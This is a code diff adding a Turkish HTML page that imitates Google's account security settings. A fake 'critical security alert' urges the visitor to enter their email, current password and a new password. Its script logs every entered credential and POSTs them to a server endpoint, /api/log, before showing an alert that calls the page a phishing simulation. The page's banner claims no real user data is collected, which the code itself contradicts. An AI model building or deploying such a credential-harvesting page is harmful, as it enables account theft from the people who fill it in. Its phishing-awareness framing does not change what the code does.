@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Güvenli Giriş - Demo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #f1f3f4;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            color: #202124;
+        }
+
+        .page-container {
+            display: flex;
+            min-height: 100vh;
+            background: #f8f9fa;
+        }
+
+        .sidebar {
+            background: #fff;
+            width: 320px;
+            border-right: 1px solid #dadce0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+        }
+
+        .sidebar-header {
+            padding: 24px 24px 16px 24px;
+            border-bottom: 1px solid #dadce0;
+        }
+
+        .google-logo {
+            color: #5f6368;
+            font-size: 20px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+        }
+
+        .google-logo::before {
+            content: "G";
+            background: #4285f4;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 500;
+            margin-right: 8px;
+        }
+
+        .sidebar-nav {
+            list-style: none;
+            padding: 8px 0;
+            margin: 0;
+        }
+
+        .sidebar-nav li {
+            margin: 0;
+        }
+
+        .sidebar-nav a {
+            color: #5f6368;
+            text-decoration: none;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            transition: all 0.2s;
+            position: relative;
+        }
+
+        .sidebar-nav a:hover {
+            background: #f1f3f4;
+            color: #202124;
+        }
+
+        .sidebar-nav a.active {
+            background: #e8f0fe;
+            color: #1a73e8;
+            font-weight: 500;
+        }
+
+        .sidebar-nav a.active::before {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background: #1a73e8;
+        }
+
+        .sidebar-nav a::after {
+            content: ">";
+            margin-left: auto;
+            font-size: 12px;
+            color: #9aa0a6;
+        }
+
+        .sidebar-nav a.active::after {
+            color: #1a73e8;
+        }
+
+        .sidebar-nav a::before {
+            content: "";
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .sidebar-nav a[href="#"]:nth-child(1)::before {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%235f6368'%3E%3Cpath d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z'/%3E%3C/svg%3E");
+        }
+
+        .sidebar-nav a[href="#"]:nth-child(2)::before {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%235f6368'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E");
+        }
+
+        .sidebar-nav a[href="#"]:nth-child(3)::before {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%235f6368'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'/%3E%3C/svg%3E");
+        }
+
+        .sidebar-nav a[href="#"]:nth-child(4)::before {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%235f6368'%3E%3Cpath d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'/%3E%3C/svg%3E");
+        }
+
+        .sidebar-nav a[href="#"]:nth-child(5)::before {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%235f6368'%3E%3Cpath d='M16 4c0-1.11.89-2 2-2s2 .89 2 2-.89 2-2 2-2-.89-2-2zm4 18v-6h2.5l-2.54-7.63A1.5 1.5 0 0 0 18.54 8H17c-.8 0-1.54.37-2.01 1l-1.99 2.5V20h-2v-6h-2v6H9V14.5l-1.99-2.5A2.5 2.5 0 0 0 5.01 8H3.46c-.8 0-1.54.37-2.01 1L1 15.37V22h2v-6h2.5l2.54-7.63A1.5 1.5 0 0 1 9.54 10H11c.8 0 1.54-.37 2.01-1L15 7.5V20h2v-6h2.5l2.54 7.63A1.5 1.5 0 0 0 22.54 22H24v-6h-2v6h-2z'/%3E%3C/svg%3E");
+        }
+
+        .sidebar-nav a[href="#"]:nth-child(6)::before {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%235f6368'%3E%3Cpath d='M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z'/%3E%3C/svg%3E");
+        }
+
+        .sidebar-nav a.active::before {
+            filter: brightness(0) saturate(100%) invert(27%) sepia(51%) saturate(2878%) hue-rotate(346deg) brightness(104%) contrast(97%);
+        }
+
+        .sidebar-header {
+            margin-bottom: 30px;
+        }
+
+        .google-logo {
+            color: #5f6368;
+            font-size: 22px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+
+        .sidebar-nav {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .sidebar-nav li {
+            margin-bottom: 8px;
+        }
+
+        .sidebar-nav a {
+            color: #5f6368;
+            text-decoration: none;
+            padding: 8px 12px;
+            border-radius: 8px;
+            display: block;
+            font-size: 14px;
+            transition: background 0.2s;
+        }
+
+        .sidebar-nav a:hover {
+            background: #f1f3f4;
+        }
+
+        .sidebar-nav a.active {
+            background: #e8f0fe;
+            color: #1a73e8;
+            font-weight: 500;
+        }
+
+        .main-content {
+            flex: 1;
+            margin-left: 320px;
+            padding: 0;
+            background: #f8f9fa;
+            min-height: 100vh;
+        }
+
+        .content-header {
+            background: #fff;
+            border-bottom: 1px solid #dadce0;
+            padding: 24px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .user-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #1a73e8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .user-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .user-name {
+            color: #202124;
+            font-size: 14px;
+            font-weight: 500;
+            margin: 0;
+        }
+
+        .user-email {
+            color: #5f6368;
+            font-size: 12px;
+            margin: 0;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .header-btn {
+            background: transparent;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 8px 16px;
+            color: #5f6368;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .header-btn:hover {
+            background: #f8f9fa;
+            border-color: #1a73e8;
+            color: #1a73e8;
+        }
+
+        .breadcrumb {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .page-title {
+            color: #202124;
+            font-size: 32px;
+            font-weight: 400;
+            margin: 0;
+            letter-spacing: 0;
+        }
+
+        .content-body {
+            padding: 40px;
+            max-width: 800px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            width: 100%;
+            margin-bottom: 24px;
+        }
+
+        .section-header {
+            padding: 24px 24px 16px 24px;
+            border-bottom: 1px solid #dadce0;
+        }
+
+        .section-title {
+            color: #202124;
+            font-size: 18px;
+            font-weight: 500;
+            margin: 0 0 8px 0;
+        }
+
+        .section-subtitle {
+            color: #5f6368;
+            font-size: 14px;
+            margin: 0;
+            line-height: 1.4;
+        }
+
+        .section-content {
+            padding: 24px;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .form-col {
+            flex: 1;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #202124;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            transition: all 0.2s;
+            background: #fff;
+            box-sizing: border-box;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+
+        .form-group input:hover {
+            border-color: #202124;
+        }
+
+        .form-group input:invalid {
+            border-color: #d93025;
+        }
+
+        .form-group input:invalid:focus {
+            border-color: #d93025;
+            box-shadow: 0 0 0 2px rgba(217, 48, 37, 0.2);
+        }
+
+        .form-help {
+            color: #5f6368;
+            font-size: 12px;
+            margin-top: 4px;
+            line-height: 1.4;
+        }
+
+        .password-strength {
+            margin-top: 8px;
+            display: flex;
+            gap: 4px;
+        }
+
+        .strength-bar {
+            height: 4px;
+            flex: 1;
+            border-radius: 2px;
+            background: #f1f3f4;
+        }
+
+        .strength-bar.weak {
+            background: #d93025;
+        }
+
+        .strength-bar.medium {
+            background: #f29900;
+        }
+
+        .strength-bar.strong {
+            background: #137333;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #202124;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            transition: all 0.2s;
+            background: #fff;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+
+        .form-group input:hover {
+            border-color: #202124;
+        }
+
+        .btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 0.25px;
+            text-transform: none;
+            padding: 12px 24px;
+            min-width: 120px;
+        }
+
+        .btn:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+        }
+
+        .btn:active {
+            background: #174ea6;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+        }
+
+        .btn-secondary:hover {
+            background: #f8f9fa;
+            border-color: #1a73e8;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            justify-content: flex-end;
+            margin-top: 24px;
+        }
+
+        .security-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid #f1f3f4;
+        }
+
+        .security-item:last-child {
+            border-bottom: none;
+        }
+
+        .security-info h3 {
+            color: #202124;
+            font-size: 16px;
+            font-weight: 500;
+            margin: 0 0 4px 0;
+        }
+
+        .security-info p {
+            color: #5f6368;
+            font-size: 14px;
+            margin: 0;
+            line-height: 1.4;
+        }
+
+        .warning {
+            background: #fce8e6;
+            border: 1px solid #f28b82;
+            color: #d93025;
+            padding: 12px;
+            border-radius: 4px;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .security-alert {
+            background: #fef7e0;
+            border: 1px solid #fbbc04;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 24px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            position: relative;
+        }
+
+        .security-alert::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: #ea8600;
+            border-radius: 8px 8px 0 0;
+        }
+
+        .alert-badge {
+            background: #ea8600;
+            color: white;
+            font-size: 10px;
+            font-weight: 500;
+            padding: 2px 6px;
+            border-radius: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: absolute;
+            top: 12px;
+            right: 16px;
+        }
+
+        .alert-icon {
+            font-size: 20px;
+            color: #ea8600;
+            margin-top: 2px;
+        }
+
+        .alert-content h3 {
+            color: #ea8600;
+            margin: 0 0 8px 0;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+
+        .alert-content p {
+            margin: 4px 0;
+            color: #5f6368;
+            font-size: 13px;
+            line-height: 1.4;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+
+        .alert-content .location {
+            color: #ea8600;
+            font-weight: 500;
+        }
+
+        .alert-content .time {
+            color: #ea8600;
+            font-weight: 500;
+        }
+
+        .demo-info {
+            background: #e8f0fe;
+            border: 1px solid #4285f4;
+            color: #1967d2;
+            padding: 12px;
+            border-radius: 4px;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="page-container">
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <div class="google-logo">Google</div>
+            </div>
+            <ul class="sidebar-nav">
+                <li><a href="#" class="active">Güvenlik</a></li>
+                <li><a href="#">Kişisel bilgiler</a></li>
+                <li><a href="#">Veri ve kişiselleştirme</a></li>
+                <li><a href="#">Gizlilik</a></li>
+                <li><a href="#">Aile</a></li>
+                <li><a href="#">Ödeme ve abonelikler</a></li>
+            </ul>
+        </div>
+        
+                <div class="main-content">
+            <div class="content-header">
+                <div class="header-left">
+                    <div class="user-avatar">A</div>
+                    <div class="user-info">
+                        <div class="user-name">Ahmet Yılmaz</div>
+                        <div class="user-email">ahmet.yilmaz@gmail.com</div>
+                    </div>
+                </div>
+                <div class="header-actions">
+                    <button class="header-btn">Hesap</button>
+                    <button class="header-btn">Çıkış yap</button>
+                </div>
+            </div>
+            
+            <div class="content-body">
+                <div class="breadcrumb">Google Hesabı > Güvenlik</div>
+                <h1 class="page-title">Güvenlik</h1>
+                
+                <div class="container">
+                    <div class="section-header">
+                        <h2 class="section-title">Oturum açma ve güvenlik</h2>
+                        <p class="section-subtitle">Hesabınızın güvenliğini artırmak için şifrenizi güncelleyin ve 2 adımlı doğrulamayı etkinleştirin.</p>
+                    </div>
+                    
+                    <div class="section-content">
+                        <div class="security-alert">
+                            <div class="alert-badge">Kritik</div>
+                            <div class="alert-icon">🔒</div>
+                            <div class="alert-content">
+                                <h3>Güvenlik Uyarısı</h3>
+                                <p><strong>Hesabınızın başka bir cihazdan erişim aldığı tespit edildi.</strong></p>
+                                <p>Son giriş: <span class="location">İstanbul, Türkiye</span> - <span class="time">2 dakika önce</span></p>
+                                <p>Bu siz değilseniz, hesabınızı hemen güvenli hale getirin.</p>
+                            </div>
+                        </div>
+
+                        <form id="loginForm">
+                            <div class="form-row">
+                                <div class="form-col">
+                                    <div class="form-group">
+                                        <label for="email">E-posta adresi</label>
+                                        <input type="email" id="email" name="email" placeholder="ornek@gmail.com" required>
+                                        <div class="form-help">Google hesabınızla ilişkili e-posta adresiniz</div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="form-row">
+                                <div class="form-col">
+                                    <div class="form-group">
+                                        <label for="password">Mevcut şifre</label>
+                                        <input type="password" id="password" name="password" required>
+                                        <div class="form-help">Hesabınızın güvenliğini doğrulamak için şifrenizi girin</div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="form-row">
+                                <div class="form-col">
+                                    <div class="form-group">
+                                        <label for="newPassword">Yeni şifre</label>
+                                        <input type="password" id="newPassword" name="newPassword" required>
+                                        <div class="form-help">En az 8 karakter uzunluğunda güçlü bir şifre oluşturun</div>
+                                        <div class="password-strength">
+                                            <div class="strength-bar weak"></div>
+                                            <div class="strength-bar"></div>
+                                            <div class="strength-bar"></div>
+                                            <div class="strength-bar"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="form-row">
+                                <div class="form-col">
+                                    <div class="form-group">
+                                        <label for="confirmPassword">Yeni şifreyi onaylayın</label>
+                                        <input type="password" id="confirmPassword" name="confirmPassword" required>
+                                        <div class="form-help">Yeni şifrenizi tekrar girin</div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="button-group">
+                                <button type="button" class="btn btn-secondary">İptal</button>
+                                <button type="submit" class="btn">Şifreyi Güncelle</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+
+                <div class="container">
+                    <div class="section-header">
+                        <h2 class="section-title">Güvenlik ayarları</h2>
+                        <p class="section-subtitle">Hesabınızın güvenliğini artırmak için ek önlemler alın.</p>
+                    </div>
+                    
+                    <div class="section-content">
+                        <div class="security-item">
+                            <div class="security-info">
+                                <h3>2 adımlı doğrulama</h3>
+                                <p>Hesabınıza ek güvenlik katmanı ekleyin</p>
+                            </div>
+                            <button class="btn btn-secondary">Etkinleştir</button>
+                        </div>
+                        
+                        <div class="security-item">
+                            <div class="security-info">
+                                <h3>Giriş uyarıları</h3>
+                                <p>Şüpheli giriş denemeleri hakkında bilgilendirilme</p>
+                            </div>
+                            <button class="btn btn-secondary">Yapılandır</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="demo-info">
+                    <strong>⚠️ EĞİTİM DEMOSU</strong><br>
+                    Bu sayfa sadece siber güvenlik eğitimi amaçlıdır. 
+                    Gerçek kullanıcı verileri toplanmaz.
+                </div>
+
+                <div class="warning">
+                    <strong>Dikkat!</strong> Bu tür sahte siteler gerçek hayatta kullanıcı bilgilerini çalmak için kullanılır. 
+                    Her zaman URL'yi kontrol edin ve şüpheli bağlantılara tıklamayın.
+                </div>
+            </div>
+        </div>
+
+    <script>
+        // Şifre gücü kontrolü
+        document.getElementById('newPassword').addEventListener('input', function(e) {
+            const password = e.target.value;
+            const strengthBars = document.querySelectorAll('.strength-bar');
+            
+            // Şifre gücünü hesapla
+            let strength = 0;
+            if (password.length >= 8) strength++;
+            if (/[a-z]/.test(password)) strength++;
+            if (/[A-Z]/.test(password)) strength++;
+            if (/[0-9]/.test(password)) strength++;
+            if (/[^A-Za-z0-9]/.test(password)) strength++;
+            
+            // Güç çubuklarını güncelle
+            strengthBars.forEach((bar, index) => {
+                bar.className = 'strength-bar';
+                if (index < strength) {
+                    if (strength <= 2) bar.classList.add('weak');
+                    else if (strength <= 3) bar.classList.add('medium');
+                    else bar.classList.add('strong');
+                }
+            });
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const newPassword = document.getElementById('newPassword').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            
+            // Zaman damgası
+            const timestamp = new Date().toLocaleString('tr-TR');
+            
+            // Log verisi
+            const logData = {
+                timestamp: timestamp,
+                email: email,
+                currentPassword: password,
+                newPassword: newPassword,
+                confirmPassword: confirmPassword,
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                referrer: document.referrer
+            };
+            
+            // Console'a yazdır (Vercel logs'da görünür)
+            console.log('🔒 EĞİTİM DEMOSU - ÖĞRENCİ VERİSİ:');
+            console.log('Zaman:', timestamp);
+            console.log('E-posta:', email);
+            console.log('Mevcut şifre:', password);
+            console.log('Yeni şifre:', newPassword);
+            console.log('Şifre onayı:', confirmPassword);
+            console.log('Tarayıcı:', navigator.userAgent);
+            console.log('URL:', window.location.href);
+            console.log('Tam log objesi:', JSON.stringify(logData, null, 2));
+            
+            // Vercel Function'a gönder (isteğe bağlı)
+            fetch('/api/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(logData)
+            }).catch(err => console.log('Log gönderilemedi:', err));
+            
+            alert('⚠️ EĞİTİM DEMOSU\n\nBu bir phishing simülasyonudur.\n\nGerçek hayatta bu tür siteler:\n- Hesap güvenliği uyarıları gösterir\n- Aciliyet duygusu yaratır\n- Şifre değiştirme formları sunar\n- Şifre gücü göstergeleri ekler\n- Kullanıcı bilgilerini çalar\n- Kimlik hırsızlığı yapar\n- Finansal zarara neden olur\n\nBu tür uyarılar gördüğünüzde:\n- URL\'yi mutlaka kontrol edin\n- Resmi siteye doğrudan gidin\n- Şüpheli bağlantılara tıklamayın!\n\nÖğrencileriniz gerçekten şaşıracak! 🎓');
+        });
+    </script>
+</body>
+</html>
